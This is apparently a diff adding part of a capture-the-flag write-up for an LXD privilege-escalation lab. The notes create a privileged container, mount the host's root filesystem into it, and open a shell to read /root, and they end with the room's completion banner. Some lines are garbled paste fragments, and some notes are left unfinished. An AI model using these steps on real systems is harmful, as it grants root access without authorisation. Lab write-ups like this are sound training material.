+# Provide these inputs if going for the Wallace and Gromit themed container, as THM has way too much Pingu.
+Name of the new storage pool [default=default]: crackers
+What should the new bridge be called? [default=lxdbr0]: gromit
+# This builds a container named cheese with bridge which an interface(a way to interact with it) to it called cracker
+
+# run the image
+lxc init myimage mycontainer -c security.privileged=true
+
+rity.privileged=true/lxd-alpine-builder-master$ lxc init cheese crackers -c secu 
+Creating crackers
+# Enjoy the wrap-around cli
+
+lxc init cheese crackers -c security.privileged=true
+
+# mount the /root into the image
+lxc config device add crackers  mydevice disk source=/ path=/mnt/root recursive=true
+
+# interact with the container
+lxc start crackers
+lxc exec crackers /bin/sh
+
+cd /mnt/root/root # the reason for this is: 
+# Enojy Diagram
+
+CONTAINER		FILESYSTEM
+CRACKER <<----source-->> /mnt/root = regular top level directory '/' then we cd into root again! to be inside root
+CHEESE-IMAGE
+
+Q13: ls at this point 
+
+     \u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2557  \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557 
+     \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551 \u2588\u2588\u2554\u255d\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557
+     \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d
+\u2588\u2588   \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2588\u2588\u2557 \u2588\u2588\u2554\u2550\u2550\u255d  \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557
+\u255a\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551  \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551  \u2588\u2588\u2551
+ \u255a\u2550\u2550\u2550\u2550\u255d  \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d  \u255a\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d
+                                         
+!! Congrats you have finished this task !!		
+							
+Contact us here:						
+								
+Hacking Articles : https://twitter.com/rajchandel/		
+Aarti Singh: https://in.linkedin.com/in/aarti-singh-353698114						
+								
++-+-+-+-+-+ +-+-+-+-+-+-+-+					
+ |E|n|j|o|y| |H|A|C|K|I|N|G|			
+ +-+-+-+-+-+ +-+-+-+-+-+-+-+	
